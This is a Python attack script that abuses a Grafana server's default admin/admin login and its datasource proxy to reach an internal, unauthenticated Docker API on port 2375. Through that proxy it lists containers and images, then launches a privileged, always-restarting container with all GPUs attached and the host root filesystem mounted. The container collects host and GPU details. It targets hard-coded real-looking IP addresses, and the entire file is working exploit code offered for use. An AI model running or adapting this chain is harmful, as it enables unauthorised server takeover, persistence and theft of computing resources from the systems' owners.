#!/usr/bin/env python3
"""i5542 phase docker: Grafana datasource proxy -> internal docker 2375 -> privileged nvidia container."""
import json, os, sys, time, requests, urllib3
urllib3.disable_warnings()
G = os.environ.get("G", "http://117.148.167.134:3000")
AUTH = ("admin", "admin")
OUT = "i5542/out"; os.makedirs(OUT, exist_ok=True)
S = requests.Session()
NAME = "i5542-docker-" + os.environ.get("HOSTTAG", "x")
TARGETS = json.loads(os.environ.get("TARGETS", '["http://192.168.120.227:2375"]'))

def save(n, o):
    open(os.path.join(OUT, n), "w").write(o if isinstance(o, str) else json.dumps(o, indent=1))

def call(method, path, body=None, timeout=40, tries=3, gap=2):
    last = None
    for i in range(tries):
        try:
            r = S.request(method, G + path, data=body, auth=AUTH, timeout=timeout, verify=False,
                          headers={"Content-Type": "application/json"})
            if r.status_code == 502 and "Target connection failed" in (r.text or ""):
                last = r; time.sleep(gap); continue
            return r
        except Exception as e:
            last = e; time.sleep(gap)
    return last

def get_ds_uid():
    r = call("GET", "/api/datasources/name/" + NAME)
    if isinstance(r, Exception) or r is None:
        return None
    if r.status_code == 200:
        return r.json()["uid"]
    body = {"name": NAME, "type": "prometheus", "access": "proxy",
            "url": TARGETS[0], "isDefault": False, "jsonData": {"httpMethod": "POST"}}
    c = call("POST", "/api/datasources", body=json.dumps(body))
    if c is not None and getattr(c, "status_code", None) in (200, 201):
        return c.json().get("datasource", {}).get("uid") or c.json().get("uid")
    r2 = call("GET", "/api/datasources/name/" + NAME)
    return r2.json()["uid"] if getattr(r2, "status_code", None) == 200 else None

def set_url(uid, url):
    body = {"id": None, "uid": uid, "orgId": 1, "name": NAME, "type": "prometheus", "access": "proxy",
            "url": url, "isDefault": False, "jsonData": {"httpMethod": "POST"}}
    r = call("PUT", "/api/datasources/uid/" + uid, body=json.dumps(body))
    return getattr(r, "status_code", None)

def rec(tag, method, path, body=None, timeout=45, tries=2):
    t = time.time()
    r = call(method, path, body=body, timeout=timeout, tries=tries)
    if isinstance(r, Exception) or r is None:
        return {"tag": tag, "path": path, "error": str(r), "dur": round(time.time() - t, 1)}
    return {"tag": tag, "path": path, "st": r.status_code, "dur": round(time.time() - t, 1),
            "body": (r.text or "")[:3000]}

def main():
    b = rec("health", "GET", "/api/health")
    print("HEALTH", b.get("st"), flush=True)
    if b.get("st") != 200:
        print("GRAFANA_DOWN", (b.get("body") or "")[:200]); return
    uid = get_ds_uid()
    print("DS", NAME, uid, flush=True)
    if not uid:
        print("NO_DS"); return
    base = "/api/datasources/proxy/uid/" + uid
    results = []
    for tgt in TARGETS:
        st = set_url(uid, tgt)
        r = {"target": tgt, "set": st}
        r["version"] = rec("version", "GET", base + "/version", timeout=25)
        print(json.dumps({"tgt": tgt, "set": st, "ver_st": r["version"].get("st"), "ver": (r["version"].get("body") or "")[:200].replace("\n", " ")}), flush=True)
        if r["version"].get("st") != 200:
            results.append(r); continue
        r["info"] = rec("info", "GET", base + "/info", timeout=25)
        r["containers"] = rec("containers", "GET", base + "/containers/json?all=1", timeout=30)
        r["images"] = rec("images", "GET", base + "/images/json?limit=50", timeout=30)
        imgs = []
        try:
            imgs = [i["RepoTags"] for i in json.loads(r["images"].get("body") or "[]") if i.get("RepoTags")]
        except Exception:
            pass
        r["image_tags"] = imgs[:40]
        cand = os.environ.get("IMAGE", "nvidia/cuda:12.4.0-base-ubuntu22.04")
        if imgs and not any(cand in t for grp in imgs for t in grp):
            flat = [t for grp in imgs for t in grp if t and "nvidia" in t.lower() or (t and ("cuda" in t.lower() or "vllm" in t.lower() or "pytorch" in t.lower()))]
            if not flat:
                flat = [t for grp in imgs for t in grp if t and t != "<none>:<none>"]
            if flat:
                cand = flat[0]
        r["used_image"] = cand
        cmd = ("id; hostname; uname -m; cat /proc/driver/nvidia/version 2>/dev/null; "
               "nvidia-smi -L 2>/dev/null; ls -l /dev/nvidia* 2>/dev/null; "
               "nvidia-smi --query-gpu=index,name,memory.total,memory.used --format=csv 2>/dev/null; "
               "cat /host/etc/hostname 2>/dev/null; systemctl is-active docker 2>/dev/null")
        spec = {"Image": cand, "Tty": True, "AttachStdout": True, "AttachStderr": True,
                "Cmd": ["sh", "-c", cmd],
                "HostConfig": {"Privileged": True, "Binds": ["/:/host"],
                               "DeviceRequests": [{"Driver": "nvidia", "Count": -1, "Capabilities": [["gpu"]]}],
                               "RestartPolicy": {"Name": "always"}}}
        cr = rec("create", "POST", base + "/containers/create?name=ulx-i5542-" + os.environ.get("HOSTTAG", "x"),
                 body=json.dumps(spec), timeout=60, tries=1)
        r["create"] = cr
        cid = None
        try:
            cid = json.loads(cr.get("body") or "{}").get("Id")
        except Exception:
            pass
        if cid:
            r["start"] = rec("start", "POST", base + "/containers/%s/start" % cid, body="", timeout=90, tries=1)
            time.sleep(6)
            r["logs"] = rec("logs", "GET", base + "/containers/%s/logs?stdout=1&stderr=1&timestamps=1" % cid, timeout=45, tries=1)
            r["inspect"] = rec("inspect", "GET", base + "/containers/%s/json" % cid, timeout=30, tries=1)
            print("LOGS", (r["logs"].get("body") or "")[:1500].replace("\n", " | "), flush=True)
        results.append(r)
        save("docker_%s.json" % os.environ.get("HOSTTAG", "x"), results)

if __name__ == "__main__":
    main()
